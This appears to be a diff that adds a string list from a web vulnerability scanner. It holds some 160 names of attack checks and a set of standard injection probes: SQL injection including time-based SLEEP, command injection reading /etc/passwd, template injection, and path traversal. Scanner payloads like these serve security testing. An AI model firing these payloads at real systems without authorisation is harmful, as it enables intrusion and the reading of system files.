@@ -1,0 +1,207 @@
+SQLi
+XSS
+SSRF
+CMDi
+SSTI
+LFI
+Open Redirect
+IDOR
+Host Header
+CORS
+Prototype Pollution
+NoSQL Injection
+XXE
+LDAP Injection
+XPath Injection
+EL Injection
+PHP Object Injection
+Race Condition
+Price Manipulation
+Payment Bypass
+Mass Assignment
+Forced Browsing
+IDOR UUID
+Subdomain Takeover
+S3 Buckets
+DNS Zone Transfer
+VHost Fuzzing
+GraphQL
+HTTP Smuggling
+Cache Poisoning
+WebSocket
+H2C Smuggling
+Blind SSRF OOB
+Blind CMDi OOB
+Blind SQLi OOB
+Log4Shell OOB
+JS Secrets
+Source Maps
+Dependency Confusion
+CSRF
+Clickjacking
+CRLF Injection
+Security Headers
+Cookie Security
+Info Disclosure
+File Upload
+RFI
+Deserialization
+Spring4Shell
+Shellshock
+SSRF Variants
+HTTP Verb Tampering
+403 Bypass
+CORS Advanced
+Open Redirect Advanced
+HPP
+JSONP
+CSP Bypass
+DOM XSS
+postMessage
+SSI Injection
+SAML
+Web Cache Deception
+Timing Attacks
+Account Takeover
+Email Injection
+ReDoS
+Null Byte
+Range Amplification
+Hop-by-Hop
+Method Override
+XSLT Injection
+Log Injection
+API Version Bypass
+Rate Limit Bypass
+Cloud Metadata
+Firebase Misconfig
+Wayback Secrets
+Tech-Specific
+IP Header Spoofing
+DNS Rebinding
+Subdomain Permutation
+Staging Exposure
+Open Ports
+SSRF → Cloud Creds
+Second Order Injection
+Open Redirect OAuth Chain
+Billion Laughs
+TRACE/OPTIONS
+HTTP/2 Rapid Reset
+XS-Leaks
+Cookie Tossing
+Param Discovery
+Token Race Condition
+Workflow Bypass
+Account Pre-Hijacking
+Server Timing Oracle
+Compression Oracle
+Dangling Markup
+ETag Tracking
+Mutation Fuzzer
+XSS Browser-Confirmed
+DOM XSS Browser
+postMessage Browser
+JS Endpoint Discovery
+Authenticated Scan
+Param Brute-Force
+Differential Analysis
+SQLi Boolean Blind
+XSS Context-Aware
+Param Value Enumeration
+Error Harvest
+Exploit Chains
+Scope Expansion
+Anomaly Detection
+Multi-Step Exploit
+Content Discovery
+Permission Boundary
+Reflection Map
+OSINT URL Seeding
+Auto Escalation
+Blind XSS Callback
+API Schema Inference
+Header Deep Analysis
+JWT Attacks
+Password Reset Poisoning
+Tech-Targeted Exploits
+API Anomaly Detection
+Role Differential (IDOR/BAC)
+AI Payload Mutation
+Business Logic
+Response Differential
+DOM XSS Advanced
+SPA Route Discovery
+postMessage Advanced
+Cloud Security
+Subdomain Takeover Real
+Stored XSS
+OAuth Bypass
+Email Header Injection
+CORS All Subdomains
+Open Redirect OAuth Chain
+Host Header Cache Poison
+Password Reset Referer Leak
+CRLF Injection Real
+Path Traversal Deep
+HTTP Smuggling Real
+WebSocket Discovery
+Blind XSS (OOB)
+CSV/Formula Injection
+Mass Assignment
+Exposed Databases
+.git Exposure
+DNS Zone Transfer
+JWT kid Injection
+Reverse Tabnabbing
+LocalStorage Secrets
+Backup Files
+Hidden Params
+Virtual Host Discovery
+User Enum Timing
+Internal IP Disclosure
+Deserialization Advanced
+Robots.txt Secrets
+Workflow Bypass
+Client-Side Template Injection
+'
+' OR '1'='1
+1' AND '1'='2
+' UNION SELECT NULL--
+1; WAITFOR DELAY '0:0:3'--
+' AND SLEEP(3)--
+1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--
+') OR ('1'='1
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND extractvalue(1,concat(0x7e,version()))--
+url
+.js
+;id
+|id
+`id`
+$(id)
+;cat /etc/passwd
+|cat /etc/passwd
+& ping -c 3 127.0.0.1 &
+;sleep 3
+|timeout 3
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+{{''.__class__.__mro__[1].__subclasses__()}}
+${T(java.lang.Runtime).getRuntime()}
+{php}echo 7*7;{/php}
+{{config}}
+../../../etc/passwd
+....//....//....//etc/passwd
+/etc/passwd%00
+..%2f..%2f..%2fetc%2fpasswd
+..\\..\\..\\windows\\win.ini
+php://filter/convert.base64-encode/resource=/etc/passwd
+file
+url
+Host
+X-Forwarded-Host
+Origin
+Origin
